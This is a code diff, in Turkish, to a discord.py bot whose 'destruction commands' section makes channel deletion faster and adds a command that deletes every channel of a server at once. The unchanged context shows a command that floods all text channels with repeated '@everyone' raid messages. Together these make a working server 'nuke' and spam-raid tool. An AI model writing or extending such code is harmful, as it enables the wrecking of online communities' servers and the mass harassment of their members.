@@ -156,6 +156,7 @@ async def birlestir_avatar(ctx, kisi1, kisi2, yuzde):
 # YIKIM KOMUTLARI (Admin)
 # ========================
 
+# --- Yavaş silme (0.5 saniye arayla) ---
 @bot.command()
 @commands.has_permissions(administrator=True)
 async def sl(ctx):
@@ -164,24 +165,45 @@ async def sl(ctx):
         await ctx.send("⚠️ Zaten silme işlemi aktif.")
         return
     silme_aktif = True
-    await ctx.send("🗑️ Tüm kanallar 2 saniye arayla siliniyor... (!sildur ile durdur)")
+    await ctx.send("🗑️ Tüm kanallar 0.5 saniye arayla siliniyor... (!sildur ile durdur)")
     for kanal in ctx.guild.channels:
         if not silme_aktif:
             break
         try:
             await kanal.delete()
-            await asyncio.sleep(2)
+            await asyncio.sleep(0.5)
         except Exception as e:
             print(f"Silme hatası: {e}")
     silme_aktif = False
     await ctx.send("✅ Kanallar silme işlemi tamamlandı veya durduruldu.")
 
+# --- Durdur ---
 @bot.command()
 @commands.has_permissions(administrator=True)
 async def sildur(ctx):
     global silme_aktif
     silme_aktif = False
     await ctx.send("🛑 Kanal silme durduruldu.")
+
+# --- TEK SEFERDE TÜM KANALLARI SİL (YENİ) ---
+@bot.command()
+@commands.has_permissions(administrator=True)
+async def slhepsi(ctx):
+    """Tüm kanalları tek seferde silmeye çalışır (riskli!)"""
+    await ctx.send("💥 Tüm kanallar tek seferde siliniyor...")
+    kanallar = ctx.guild.channels
+    basarili = 0
+    basarisiz = 0
+    
+    for kanal in kanallar:
+        try:
+            await kanal.delete()
+            basarili += 1
+        except Exception as e:
+            basarisiz += 1
+            print(f"Silinemedi: {kanal.name} - {e}")
+    
+    await ctx.send(f"✅ **{basarili}** kanal silindi.\n❌ **{basarisiz}** kanal silinemedi.")
 
 # --- Hızlı spam (aynı anda tüm kanallara, 0.7 saniye bekle) ---
 @bot.command()
@@ -198,7 +220,7 @@ async def spam(ctx):
         for kanal in ctx.guild.text_channels:
             tasks.append(kanal.send("KLOWINC BİR UGRADI! @everyone"))
         await asyncio.gather(*tasks, return_exceptions=True)
-        await asyncio.sleep(0.7)  # 0.7 saniye bekle
+        await asyncio.sleep(0.7)
     await ctx.send("✅ Spam durduruldu.")
 
 # --- Yavaş spam (tek tek) ---
@@ -222,6 +244,7 @@ async def spamyavas(ctx):
         await asyncio.sleep(0.5)
     await ctx.send("✅ Spam durduruldu.")
 
+# --- Spam durdur ---
 @bot.command()
 @commands.has_permissions(administrator=True)
 async def dur(ctx):
@@ -229,7 +252,7 @@ async def dur(ctx):
     spam_aktif = False
     await ctx.send("🛑 Spam durduruldu.")
 
-# --- Yeni Yıkım Komutları ---
+# --- Diğer Yıkım Komutları ---
 @bot.command()
 @commands.has_permissions(manage_roles=True)
 async def roluştur(ctx, *, isim):
@@ -908,7 +931,7 @@ async def yardım(ctx):
         description="Botun tüm komutları (görsel zengin!)",
         color=discord.Color.blue()
     )
-    embed.add_field(name="⚠️ Yıkım (Admin)", value="`!sl`, `!sildur`\n`!spam` (hızlı), `!spamyavas` (yavaş), `!dur`\n`!rololuştur <isim>`, `!rolsil <rol>`\n`!everyone <mesaj>`, `!kanalkilit`, `!kanalaç`", inline=False)
+    embed.add_field(name="⚠️ Yıkım (Admin)", value="`!sl` (yavaş sil), `!slhepsi` (tek seferde sil)\n`!sildur` (durdur)\n`!spam` (hızlı), `!spamyavas` (yavaş), `!dur`\n`!rololuştur <isim>`, `!rolsil <rol>`\n`!everyone <mesaj>`, `!kanalkilit`, `!kanalaç`", inline=False)
     embed.add_field(name="😂 Eski Eğlence", value="`!valdo`, `!gonu`, `!eternal`, `!klowinc`, `!doruk`", inline=False)
     embed.add_field(name="🎲 Klasik Eğlence", value="`!zar`, `!yazitura`, `!şanslısayı`, `!korkut`, `!aşkfalı`", inline=False)
     embed.add_field(name="📅 Bilgi", value="`!tarih`, `!ping`, `!kullanıcıbilgi`, `!sunucubilgi`, `!rolbilgi <rol>`", inline=False)
